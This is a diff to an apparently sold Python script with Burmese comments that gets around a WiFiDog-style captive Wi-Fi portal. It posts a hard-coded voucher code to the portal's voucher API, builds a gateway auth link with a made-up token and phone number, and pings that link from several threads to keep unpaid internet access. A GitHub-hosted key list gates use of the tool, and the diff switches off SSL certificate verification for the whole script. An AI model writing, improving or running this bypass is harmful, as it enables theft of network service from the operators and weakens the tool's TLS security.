@@ -6,12 +6,15 @@ import threading
 from datetime import datetime, timedelta
 import sys
 import os
+import ssl
 
+# --- SSL ERROR FIX ---
+ssl._create_default_https_context = ssl._create_unverified_context
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
 PING_THREADS = 5
-PING_INTERVAL = 0.1 
+PING_INTERVAL = 0.5 
 # !!! သင့် keys.txt ရဲ့ RAW Link ကို ဒီမှာထည့်ပါ !!!
 KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
 
@@ -21,7 +24,7 @@ def clear_screen():
 
 # --- TOKEN LICENSE SYSTEM ---
 def check_license():
-    """Token တောင်းခြင်းနှင့် သက်တမ်းစစ်ခြင်း (Cache ကျော်ရန် ပြင်ဆင်ထားသည်)"""
+    """Token နှင့် ရက်စွဲစစ်ခြင်း (Cache ကျော်ရန် ပြင်ဆင်ထားသည်)"""
     clear_screen()
     print("========================================")
     print("       🔑 TOKEN ACCESS SYSTEM         ")
@@ -42,6 +45,8 @@ def check_license():
         if "|" not in line or line.startswith("#"): continue
         try:
             key, start_date_str, unit, amount = line.split("|")
+            # --- DATE CORRECTION ---
+            # GitHub က ရက်စွဲအတိုင်း တိတိကျကျတွက်ရန်
             start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
             amount = int(amount)
         except: continue
@@ -92,15 +97,22 @@ def countdown_timer(remaining_time):
 # --- INTERNET ACCESS LOGIC (CAPTIVE PORTAL) ---
 def check_real_internet():
     try:
+        # Google ကို Ping ထိုးပြီး စစ်ဆေးခြင်း
         return requests.get("http://www.google.com", timeout=3).status_code == 200
     except: return False
 
 def high_speed_ping(auth_link, session, sid):
-    """Auth Link ကို အဆက်မပြတ် Request Pို့ပေးခြင်း"""
+    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း နှင့် Status ပြခြင်း"""
     while True:
         try:
             res = session.get(auth_link, timeout=5)
-        except: break
+            if res.status_code == 200:
+                print(f"\r✅ Ping Success - {datetime.now().strftime('%H:%M:%S')}", end="", flush=True)
+            else:
+                print(f"\r⚠️ Ping Failed - Status: {res.status_code}", end="", flush=True)
+        except Exception as e:
+            print(f"\r❌ Timeout - {datetime.now().strftime('%H:%M:%S')}   ", end="", flush=True)
+        
         time.sleep(PING_INTERVAL)
 
 def start_process():
@@ -114,6 +126,7 @@ def start_process():
             r = requests.get(test_url, allow_redirects=True, timeout=5)
             if r.url == test_url:
                 if check_real_internet():
+                    print("\r🌐 အင်တာနက် ချိတ်ဆက်ပြီးပါပြီ။      ", end="", flush=True)
                     time.sleep(5)
                     continue
             
@@ -137,7 +150,7 @@ def start_process():
                 # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                 voucher_api = f"{portal_host}/api/auth/voucher/"
                 try:
-                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                 except:
                     pass
 
@@ -147,6 +160,7 @@ def start_process():
                 gw_port = params.get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
+                print("\n🔗 အင်တာနက် ချိတ်ဆက်နေသည်...")
                 for _ in range(PING_THREADS):
                     threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
 
@@ -154,6 +168,7 @@ def start_process():
                     time.sleep(5)
 
         except Exception as e:
+            print(f"\r❌ Portal Error: {e}      ", end="", flush=True)
             time.sleep(5)
 
 # --- MAIN RUNNER ---
@@ -162,4 +177,4 @@ if __name__ == "__main__":
         start_process()
     else:
         print("🚫 အသုံးပြုခွင့် မရှိပါ။")
-                
+        
